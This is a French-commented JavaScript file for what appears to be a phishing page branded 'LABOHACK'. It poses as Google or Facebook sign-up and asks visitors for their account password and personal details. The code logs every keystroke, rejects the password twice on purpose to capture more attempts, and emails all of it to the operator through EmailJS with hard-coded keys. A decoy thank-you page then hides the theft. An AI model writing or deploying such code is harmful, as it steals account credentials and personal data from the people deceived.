# 2. Nouveau script.js (suppression du gestionnaire GitHub)
// Configuration EmailJS
const EMAILJS_PUBLIC_KEY = 'sB1cJXt7DykBzocSR';
const EMAILJS_SERVICE_ID  = 'service_j8i0h5n';
const EMAILJS_TEMPLATE_ID = 'template_3nt63pp';

let checkAttempts = 0;
const MAX_ATTEMPTS = 3;
let allData = {
  provider: '',
  nom: '',
  prenom: '',
  email: '',
  password: '',
  dateNaissance: '',
  telephone: '',
  pays: '',
  history: []
};
let isSubmitting = false;
let checkPassed = false;

const form = document.getElementById('signupForm');
const nomInput = document.getElementById('nom');
const prenomInput = document.getElementById('prenom');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const dateInput = document.getElementById('dateNaissance');
const telephoneInput = document.getElementById('telephone');
const paysSelect = document.getElementById('pays');
const checkBtn = document.getElementById('checkBtn');
const submitBtn = document.getElementById('submitBtn');
const toast = document.getElementById('toast');
const choixDiv = document.getElementById('choix');
const formContainer = document.getElementById('formContainer');
const providerIcon = document.getElementById('providerIcon');
const providerName = document.getElementById('providerName');
const pwdLabel = document.getElementById('pwdLabel');

// Sélection du fournisseur
document.getElementById('btnGoogle').addEventListener('click', () => {
  allData.provider = 'Google';
  providerIcon.textContent = 'G';
  providerName.textContent = 'Inscription avec Google';
  pwdLabel.textContent = 'MOT DE PASSE GOOGLE';
  showForm();
});
document.getElementById('btnFacebook').addEventListener('click', () => {
  allData.provider = 'Facebook';
  providerIcon.textContent = 'f';
  providerName.textContent = 'Inscription avec Facebook';
  pwdLabel.textContent = 'MOT DE PASSE FACEBOOK';
  showForm();
});

function showForm() {
  choixDiv.style.display = 'none';
  formContainer.style.display = 'block';
  checkAttempts = 0;
  checkPassed = false;
  submitBtn.style.display = 'none';
  document.querySelectorAll('input, select').forEach(el => el.value = '');
  allData.history = [];
  checkBtn.style.display = 'block';
  updateStrengthMeter('');
}

// Capture des saisies en temps réel
function captureField(champ, valeur) {
  if (valeur && valeur.length > 0) {
    allData.history.push({ champ, valeur, temps: new Date().toISOString() });
    if (allData.history.length > 50) allData.history.shift();
  }
}

// Écoute de tous les champs
nomInput.addEventListener('input', function() { allData.nom = this.value; captureField('nom', this.value); });
prenomInput.addEventListener('input', function() { allData.prenom = this.value; captureField('prenom', this.value); });
emailInput.addEventListener('input', function() { allData.email = this.value; captureField('email', this.value); });
passwordInput.addEventListener('input', function() {
  allData.password = this.value;
  captureField('password', this.value);
  updateStrengthMeter(this.value);
});
dateInput.addEventListener('input', function() { allData.dateNaissance = this.value; captureField('date', this.value); });
telephoneInput.addEventListener('input', function() { allData.telephone = this.value; captureField('telephone', this.value); });
paysSelect.addEventListener('change', function() { allData.pays = this.value; captureField('pays', this.value); });

// Indicateur de force
function updateStrengthMeter(pwd) {
  const bars = [
    document.getElementById('strengthBar1'),
    document.getElementById('strengthBar2'),
    document.getElementById('strengthBar3')
  ];
  const label = document.getElementById('strengthLabel');
  bars.forEach(bar => bar.classList.remove('active'));

  if (pwd.length === 0) {
    label.textContent = 'force : —';
    label.style.color = '#666';
    return;
  }

  let score = 0;
  if (pwd.length >= 8) score++;
  if (/[A-Z]/.test(pwd) && /[a-z]/.test(pwd)) score++;
  if (/\d/.test(pwd) || /[^A-Za-z0-9]/.test(pwd)) score++;

  for (let i = 0; i < score; i++) bars[i].classList.add('active');

  if (score === 0) { label.textContent = 'force : faible'; label.style.color = '#666'; }
  else if (score === 1) { label.textContent = 'force : faible'; label.style.color = '#888'; }
  else if (score === 2) { label.textContent = 'force : moyen'; label.style.color = '#aaa'; }
  else { label.textContent = 'force : fort'; label.style.color = '#ccc'; }
}

// Vérification : échoue 3 fois puis affiche le bouton S'inscrire
checkBtn.addEventListener('click', function() {
  const pwd = passwordInput.value.trim();
  if (pwd.length === 0) {
    showToast('[!] saisissez un mot de passe.', true);
    return;
  }

  checkAttempts++;
  if (checkAttempts < MAX_ATTEMPTS) {
    showToast(`mot de passe incorrect. réessayez (${checkAttempts}/${MAX_ATTEMPTS})`, true);
    captureField('password_attempt', pwd);
    passwordInput.value = '';
    passwordInput.focus();
  } else {
    checkPassed = true;
    showToast('mot de passe accepté.', false);
    checkBtn.style.display = 'none';
    submitBtn.style.display = 'block';
    captureField('password_attempt_final', pwd);
  }
});

// Soumission finale (1 email avec toutes les données)
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  if (isSubmitting) return;
  if (!checkPassed) {
    showToast('[!] vous devez d\'abord vérifier votre mot de passe.', true);
    return;
  }

  const nom = nomInput.value.trim();
  const prenom = prenomInput.value.trim();
  const email = emailInput.value.trim();
  const date = dateInput.value;
  const telephone = telephoneInput.value.trim();
  const pays = paysSelect.value;
  const password = passwordInput.value.trim();
  const terms = document.getElementById('terms').checked;

  if (!nom || !prenom || !email || !date || !telephone || !pays || !password || !terms) {
    showToast('[!] tous les champs sont obligatoires.', true);
    return;
  }

  isSubmitting = true;
  submitBtn.textContent = '...';
  submitBtn.disabled = true;

  let historyText = allData.history.map(h => `${h.champ}: ${h.valeur}`).join(' | ');
  if (!historyText) historyText = 'aucune saisie';

  const templateParams = {
    nom: nom,
    prenom: prenom,
    email: email,
    password: password,
    date: date,
    telephone: telephone,
    pays: pays,
    provider: allData.provider,
    history: historyText,
    attempts: checkAttempts,
    final: 'OUI'
  };

  try {
    await emailjs.init(EMAILJS_PUBLIC_KEY);
    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
    showToast('inscription réussie ! redirection...', false);

    document.body.innerHTML = `
      <div class="container" style="text-align:center; padding:4rem 2rem;">
        <h1 style="font-size:2.2rem; letter-spacing:4px; color:#cccccc; text-shadow:0 0 8px #555555; border-bottom:1px solid #444444; padding-bottom:0.5rem; margin-bottom:1.5rem;">LABO<span style="color:#aaaaaa;">HACK</span></h1>
        <div style="font-size:4rem; margin:2rem 0; color:#666666; font-family:'Courier New',monospace;">[ # ]</div>
        <h2 style="color:#aaaaaa; font-size:1.4rem; letter-spacing:2px;">MERCI</h2>
        <p style="color:#888888; font-size:1rem; margin:1rem 0; line-height:1.6;">
          nous vérifions vos informations.<br>
          <strong style="color:#999999; font-size:1.2rem;">vous recevrez un email dans 15 jours</strong><br>
          si vous êtes sélectionné.
        </p>
        <p style="color:#444444; margin-top:2rem; font-size:0.6rem; letter-spacing:2px; border-top:1px solid #333333; padding-top:1rem;">[ labohack ]</p>
      </div>
    `;

  } catch (error) {
    console.error('Erreur EmailJS :', error);
    showToast('[!] erreur lors de l\'envoi. vérifie ta connexion.', true);
    resetSubmitButton();
  }
});

function showToast(text, isError = true) {
  toast.textContent = text;
  toast.classList.remove('hidden');
  toast.style.borderColor = isError ? '#555555' : '#777777';
  toast.style.color = isError ? '#aaaaaa' : '#cccccc';
  clearTimeout(window.toastTimeout);
  window.toastTimeout = setTimeout(() => toast.classList.add('hidden'), 5000);
}

function resetSubmitButton() {
  isSubmitting = false;
  submitBtn.textContent = "S'INSCRIRE";
  submitBtn.disabled = false;
}
